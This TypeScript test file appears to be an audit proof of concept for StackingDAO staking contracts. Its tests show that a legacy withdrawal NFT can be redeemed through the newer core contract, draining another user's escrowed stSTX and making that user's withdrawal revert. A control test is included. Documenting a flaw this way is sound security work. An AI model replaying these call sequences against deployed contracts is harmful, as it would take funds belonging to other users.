import { describe, expect, it } from "vitest";
import { Cl, ClarityType, ResponseOkCV, TupleCV, UIntCV } from "@stacks/transactions";
import { mineEmptyBlockUntil, qualifiedName } from "../wrappers/tests-utils";

const accounts = simnet.getAccounts();
const deployer = accounts.get("deployer")!;
const legacy = accounts.get("wallet_1")!;
const current = accounts.get("wallet_2")!;

const MICRO = 1_000_000n;
const LEGACY_AMOUNT = 100n * MICRO;
const CURRENT_AMOUNT = 200n * MICRO;

function setActive(contractName: string, active: boolean) {
  return simnet.callPublicFn(
    "dao",
    "set-contract-active",
    [Cl.principal(qualifiedName(contractName)), Cl.bool(active)],
    deployer,
  ).result;
}

function depositStStx(caller: string, amount: bigint) {
  return simnet.callPublicFn(
    "stacking-dao-core-v6",
    "deposit",
    [
      Cl.principal(qualifiedName("reserve-v1")),
      Cl.principal(qualifiedName("commission-v2")),
      Cl.principal(qualifiedName("staking-v1")),
      Cl.principal(qualifiedName("direct-helpers-v4")),
      Cl.uint(amount),
      Cl.none(),
      Cl.none(),
    ],
    caller,
  ).result;
}

function depositStStxBtc(caller: string, amount: bigint) {
  return simnet.callPublicFn(
    "stacking-dao-core-btc-v3",
    "deposit",
    [
      Cl.principal(qualifiedName("reserve-v1")),
      Cl.principal(qualifiedName("commission-v2")),
      Cl.principal(qualifiedName("staking-v1")),
      Cl.principal(qualifiedName("direct-helpers-v4")),
      Cl.uint(amount),
      Cl.none(),
      Cl.none(),
    ],
    caller,
  ).result;
}

function initLegacyStStx(caller: string, amount: bigint) {
  return simnet.callPublicFn(
    "stacking-dao-core-v5",
    "init-withdraw",
    [
      Cl.principal(qualifiedName("reserve-v1")),
      Cl.principal(qualifiedName("direct-helpers-v4")),
      Cl.uint(amount),
    ],
    caller,
  ).result;
}

function initCurrentStStx(caller: string, amount: bigint) {
  return simnet.callPublicFn(
    "stacking-dao-core-v6",
    "init-withdraw",
    [
      Cl.principal(qualifiedName("reserve-v1")),
      Cl.principal(qualifiedName("direct-helpers-v4")),
      Cl.uint(amount),
    ],
    caller,
  ).result;
}

function withdrawCurrentStStx(caller: string, nftId: bigint) {
  return simnet.callPublicFn(
    "stacking-dao-core-v6",
    "withdraw",
    [
      Cl.principal(qualifiedName("reserve-v1")),
      Cl.principal(qualifiedName("commission-v2")),
      Cl.principal(qualifiedName("staking-v1")),
      Cl.uint(nftId),
    ],
    caller,
  ).result;
}

function initLegacyStStxBtc(caller: string, amount: bigint) {
  return simnet.callPublicFn(
    "stacking-dao-core-btc-v2",
    "init-withdraw",
    [
      Cl.principal(qualifiedName("reserve-v1")),
      Cl.principal(qualifiedName("direct-helpers-v4")),
      Cl.uint(amount),
    ],
    caller,
  ).result;
}

function initCurrentStStxBtc(caller: string, amount: bigint) {
  return simnet.callPublicFn(
    "stacking-dao-core-btc-v3",
    "init-withdraw",
    [
      Cl.principal(qualifiedName("reserve-v1")),
      Cl.principal(qualifiedName("direct-helpers-v4")),
      Cl.uint(amount),
    ],
    caller,
  ).result;
}

function withdrawCurrentStStxBtc(caller: string, nftId: bigint) {
  return simnet.callPublicFn(
    "stacking-dao-core-btc-v3",
    "withdraw",
    [
      Cl.principal(qualifiedName("reserve-v1")),
      Cl.principal(qualifiedName("commission-v2")),
      Cl.principal(qualifiedName("staking-v1")),
      Cl.uint(nftId),
    ],
    caller,
  ).result;
}

function balance(token: string, account: string): bigint {
  const cv = simnet.callReadOnlyFn(token, "get-balance", [Cl.principal(account)], deployer).result;
  expect(cv.type).toBe(ClarityType.ResponseOk);
  const inner = (cv as ResponseOkCV).value;
  expect(inner.type).toBe(ClarityType.UInt);
  return (inner as UIntCV).value;
}

function okTuple(cv: any): TupleCV {
  expect(cv.type).toBe(ClarityType.ResponseOk);
  const inner = (cv as ResponseOkCV).value;
  expect(inner.type).toBe(ClarityType.Tuple);
  return inner as TupleCV;
}

function tupleUint(tuple: TupleCV, name: string): bigint {
  const value = tuple.data[name];
  expect(value.type).toBe(ClarityType.UInt);
  return (value as UIntCV).value;
}

function fundReserve() {
  expect(
    simnet.transferSTX(2_000n * MICRO, qualifiedName("reserve-v1"), deployer).result,
  ).toBeOk(Cl.bool(true));
}

describe("cross-version withdrawal custody collision", () => {
  it("VULNERABLE_STSTX: active v6 finalizes a legacy v5 NFT and burns unrelated v6 escrow", () => {
    expect(setActive("stacking-dao-core-v5", true)).toBeOk(Cl.bool(true));

    expect(depositStStx(legacy, LEGACY_AMOUNT)).toBeOk(Cl.uint(LEGACY_AMOUNT));
    expect(initLegacyStStx(legacy, LEGACY_AMOUNT)).toBeOk(Cl.uint(100000));
    expect(balance("ststx-token", legacy)).toBe(0n);

    expect(setActive("stacking-dao-core-v5", false)).toBeOk(Cl.bool(true));

    expect(depositStStx(current, CURRENT_AMOUNT)).toBeOk(Cl.uint(CURRENT_AMOUNT));
    expect(initCurrentStStx(current, CURRENT_AMOUNT)).toBeOk(Cl.uint(100001));
    expect(balance("ststx-token", qualifiedName("stacking-dao-core-v6"))).toBe(CURRENT_AMOUNT);

    fundReserve();
    mineEmptyBlockUntil(60);

    const beforeLegacy = balance("ststx-token", qualifiedName("stacking-dao-core-v6"));
    const legacyResult = okTuple(withdrawCurrentStStx(legacy, 100000n));
    const paid = tupleUint(legacyResult, "stx-user-amount");
    const afterLegacy = balance("ststx-token", qualifiedName("stacking-dao-core-v6"));

    expect(beforeLegacy - afterLegacy).toBe(LEGACY_AMOUNT);
    expect(afterLegacy).toBe(CURRENT_AMOUNT - LEGACY_AMOUNT);

    const victimResult = withdrawCurrentStStx(current, 100001n);
    expect(victimResult.type).toBe(ClarityType.ResponseErr);

    console.log(`VULNERABLE_STSTX legacyClaimPaidMicro=${paid}`);
    console.log(`VULNERABLE_STSTX currentEscrowBeforeMicro=${beforeLegacy}`);
    console.log(`VULNERABLE_STSTX currentEscrowConsumedMicro=${beforeLegacy - afterLegacy}`);
    console.log(`VULNERABLE_STSTX victimClaimBurnMicro=${CURRENT_AMOUNT}`);
    console.log(`VULNERABLE_STSTX victimWithdrawReverted=true`);
  });

  it("VULNERABLE_STSTXBTC: active BTC-v3 finalizes a legacy BTC-v2 NFT and burns unrelated v3 escrow", () => {
    expect(setActive("stacking-dao-core-btc-v2", true)).toBeOk(Cl.bool(true));

    expect(depositStStxBtc(legacy, LEGACY_AMOUNT)).toBeOk(Cl.uint(LEGACY_AMOUNT));
    expect(initLegacyStStxBtc(legacy, LEGACY_AMOUNT)).toBeOk(Cl.uint(0));
    expect(balance("ststxbtc-token-v2", legacy)).toBe(0n);

    expect(setActive("stacking-dao-core-btc-v2", false)).toBeOk(Cl.bool(true));

    expect(depositStStxBtc(current, CURRENT_AMOUNT)).toBeOk(Cl.uint(CURRENT_AMOUNT));
    expect(initCurrentStStxBtc(current, CURRENT_AMOUNT)).toBeOk(Cl.uint(1));
    expect(balance("ststxbtc-token-v2", qualifiedName("stacking-dao-core-btc-v3"))).toBe(CURRENT_AMOUNT);

    fundReserve();
    mineEmptyBlockUntil(60);

    const beforeLegacy = balance("ststxbtc-token-v2", qualifiedName("stacking-dao-core-btc-v3"));
    const legacyResult = okTuple(withdrawCurrentStStxBtc(legacy, 0n));
    const paid = tupleUint(legacyResult, "stx-user-amount");
    const afterLegacy = balance("ststxbtc-token-v2", qualifiedName("stacking-dao-core-btc-v3"));

    expect(beforeLegacy - afterLegacy).toBe(LEGACY_AMOUNT);
    expect(afterLegacy).toBe(CURRENT_AMOUNT - LEGACY_AMOUNT);

    const victimResult = withdrawCurrentStStxBtc(current, 1n);
    expect(victimResult.type).toBe(ClarityType.ResponseErr);

    console.log(`VULNERABLE_STSTXBTC legacyClaimPaidMicro=${paid}`);
    console.log(`VULNERABLE_STSTXBTC currentEscrowBeforeMicro=${beforeLegacy}`);
    console.log(`VULNERABLE_STSTXBTC currentEscrowConsumedMicro=${beforeLegacy - afterLegacy}`);
    console.log(`VULNERABLE_STSTXBTC victimClaimBurnMicro=${CURRENT_AMOUNT}`);
    console.log(`VULNERABLE_STSTXBTC victimWithdrawReverted=true`);
  });

  it("CONTROL: two current-origin v6 claims consume only their own escrow and both settle", () => {
    expect(depositStStx(legacy, LEGACY_AMOUNT)).toBeOk(Cl.uint(LEGACY_AMOUNT));
    expect(initCurrentStStx(legacy, LEGACY_AMOUNT)).toBeOk(Cl.uint(100000));
    expect(depositStStx(current, CURRENT_AMOUNT)).toBeOk(Cl.uint(CURRENT_AMOUNT));
    expect(initCurrentStStx(current, CURRENT_AMOUNT)).toBeOk(Cl.uint(100001));

    fundReserve();
    mineEmptyBlockUntil(60);

    expect(withdrawCurrentStStx(legacy, 100000n).type).toBe(ClarityType.ResponseOk);
    expect(withdrawCurrentStStx(current, 100001n).type).toBe(ClarityType.ResponseOk);
    const residual = balance("ststx-token", qualifiedName("stacking-dao-core-v6"));
    expect(residual).toBe(0n);

    console.log(`CONTROL currentClaimsSettled=2`);
    console.log(`CONTROL currentEscrowResidualMicro=${residual}`);
  });
});
